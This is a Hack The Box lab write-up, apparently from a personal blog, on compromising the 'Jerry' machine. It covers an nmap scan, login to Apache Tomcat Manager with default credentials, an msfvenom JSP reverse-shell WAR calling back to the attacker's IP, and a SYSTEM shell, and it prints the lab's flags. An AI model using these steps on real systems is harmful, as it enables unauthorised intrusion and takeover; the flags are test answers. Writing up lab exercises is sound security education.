---
title: "HTB: Jerry"
date: 2025-12-22 00:00 +0800
categories: [HTB,Easy]
tags: [HTB,Easy,JSP Bypass, msfvenom]
image: https://github.com/user-attachments/assets/8eeee302-751c-41ca-b63f-39585df936f9
---

<img width="882" height="357" alt="image" src="https://github.com/user-attachments/assets/8eeee302-751c-41ca-b63f-39585df936f9" />

## Tools

- nmap
- searchsploit
- msfvenom
- penelope

## Initial Discovery

Nmap scan result:

```
┌──(kali㉿kali)-[~/Desktop/HTB/Jerry]
└─$ nmap -sCV -p- -T4 -vvv jerry.htb                                                                                                                                                         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-22 11:25 +08
NSE: Loaded 157 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:25
Completed NSE at 11:25, 0.00s elapsed
Initiating Ping Scan at 11:25
Scanning jerry.htb (10.10.10.95) [4 ports]
Completed Ping Scan at 11:25, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 11:25
Scanning jerry.htb (10.10.10.95) [65535 ports]
Discovered open port 8080/tcp on 10.10.10.95
SYN Stealth Scan Timing: About 19.01% done; ETC: 11:28 (0:02:12 remaining)
SYN Stealth Scan Timing: About 48.05% done; ETC: 11:27 (0:01:06 remaining)
SYN Stealth Scan Timing: About 69.46% done; ETC: 11:28 (0:00:40 remaining)
Completed SYN Stealth Scan at 11:27, 123.69s elapsed (65535 total ports)
Initiating Service scan at 11:27
Scanning 1 service on jerry.htb (10.10.10.95)
Completed Service scan at 11:27, 6.05s elapsed (1 service on 1 host)
NSE: Script scanning 10.10.10.95.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:27
Completed NSE at 11:28, 5.06s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:28
Completed NSE at 11:28, 0.19s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:28
Completed NSE at 11:28, 0.00s elapsed
Nmap scan report for jerry.htb (10.10.10.95)
Host is up, received echo-reply ttl 127 (0.018s latency).
Scanned at 2025-12-22 11:25:49 +08 for 136s
Not shown: 65534 filtered tcp ports (no-response)
PORT     STATE SERVICE REASON          VERSION
8080/tcp open  http    syn-ack ttl 127 Apache Tomcat/Coyote JSP engine 1.1
|_http-title: Apache Tomcat/7.0.88
| http-methods:
|_  Supported Methods: GET HEAD POST OPTIONS
|_http-server-header: Apache-Coyote/1.1
|_http-favicon: Apache Tomcat

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 11:28
Completed NSE at 11:28, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 11:28
Completed NSE at 11:28, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 11:28
Completed NSE at 11:28, 0.00s elapsed
Read data files from: /usr/share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 135.50 seconds
           Raw packets sent: 131167 (5.771MB) | Rcvd: 181 (21.468KB)
```

From the scan result, we identify there's **Apache Tomcat/Coyote JSP** running service on **port 8080** .Then i would add the hostname as `jerry.htb` for local known dns which located at **/etc/hosts**

Navigated **http[:]//jerry[.]htb[:]8080** and it appear to be running with `Apache Tomcat/7.0.88`.

<img width="1030" height="402" alt="image" src="https://github.com/user-attachments/assets/8a9a4fd7-22a6-405f-b0dd-3999d6ed213f" />

After a little bit of information gathering, i find when visiting **Server Status** required for username and password. I tried with `admin:admin` and we are authorized.

<img width="414" height="290" alt="image" src="https://github.com/user-attachments/assets/d05c8632-9707-443a-88bb-61ba418806da" />

However when we try to access **List Application**, i wasn't able to gain access and it brought us to **401 Access Denied** page instead.

<img width="1895" height="733" alt="image" src="https://github.com/user-attachments/assets/5b3db3b5-43b6-483b-a7b1-e5d8bfc999e8" />

The Tomcat Manager interface was misconfigured and left using default/example credentials. Authenticating as `tomcat:s3cret`, which has the **manager-gui** role, grants access to the Manager GUI and the list of deployed applications.

<img width="1919" height="415" alt="image" src="https://github.com/user-attachments/assets/c6493a7e-0222-4119-930d-8c5aae25c05a" />


## Exploitation

Verify if the user tomcat is valid user and we are authorized. We can upload our own revshell payload through deploy `.war` file upload.

<img width="1191" height="487" alt="image" src="https://github.com/user-attachments/assets/a5f69a6c-ddf3-4383-9f69-af6265a4aea9" />

<img width="1917" height="687" alt="image" src="https://github.com/user-attachments/assets/ad47d4da-9412-4f21-8fc4-cc6db91a5160" />

<img width="1916" height="287" alt="image" src="https://github.com/user-attachments/assets/9641a0c6-a077-41bc-8941-c4c75ed17a41" />

First generate our payload by using **msfvenom**.

```
┌──(kali㉿kali)-[~/Desktop/HTB/Jerry]
└─$ msfvenom -p java/jsp_shell_reverse_tcp LHOST=10.10.16.2 LPORT=4444 -f war -o payload.war
Payload size: 1104 bytes
Final size of war file: 1104 bytes
Saved as: payload.war
```

Setup a listener with the same port as our payload. And we will be using **penelope** for that:

```

┌──(kali㉿kali)-[~/Desktop/HTB/Jerry]
└─$ penelope                              
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 172.18.0.1 • 172.17.0.1 • 10.10.16.2
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
````

Upload our payload through deploy and simply interact with the payload from list.

<img width="1908" height="581" alt="image" src="https://github.com/user-attachments/assets/23a3dd23-a5df-4a88-9e0a-44e9f18f1a49" />

Get a shell through our **penelope** as authority\system
```
┌──(kali㉿kali)-[~/Desktop/HTB/Jerry]
└─$ penelope                              
[+] Listening for reverse shells on 0.0.0.0:4444 →  127.0.0.1 • 192.168.134.128 • 172.18.0.1 • 172.17.0.1 • 10.10.16.2
➤  🏠 Main Menu (m) 💀 Payloads (p) 🔄 Clear (Ctrl-L) 🚫 Quit (q/Ctrl-C)
[+] Got reverse shell from JERRY~10.10.10.95-Microsoft_Windows_Server_2012_R2_Standard-x64-based_PC 😍 Assigned SessionID <1>
[+] Added readline support...
[+] Interacting with session [1], Shell Type: Readline, Menu key: Ctrl-D 
[+] Logging to /home/kali/.penelope/sessions/JERRY~10.10.10.95-Microsoft_Windows_Server_2012_R2_Standard-x64-based_PC/2025_12_22-11_54_22-292.log 📜
──────────────────────────────────────────────────────────────────────────────────────────────
whoami
whoami
nt authority\system
```

We can find the flag located inside **"C:\Users\Administrator\Desktop\flags"**, use type to read the content and we get both user and root flag.

```
C:\Users\Administrator\Desktop>cd flags
cd flags

C:\Users\Administrator\Desktop\flags>dir
dir
 Volume in drive C has no label.
 Volume Serial Number is 0834-6C04

 Directory of C:\Users\Administrator\Desktop\flags

06/19/2018  06:09 AM    <DIR>          .
06/19/2018  06:09 AM    <DIR>          ..
06/19/2018  06:11 AM                88 2 for the price of 1.txt
               1 File(s)             88 bytes
               2 Dir(s)   2,419,851,264 bytes free

C:\Users\Administrator\Desktop\flags>type "2 for the price of 1.txt"
type "2 for the price of 1.txt"
user.txt
7004dbcef0f854e0fb401875f26ebd00

root.txt
04a8b36e1545a455393d067e772fe90
```
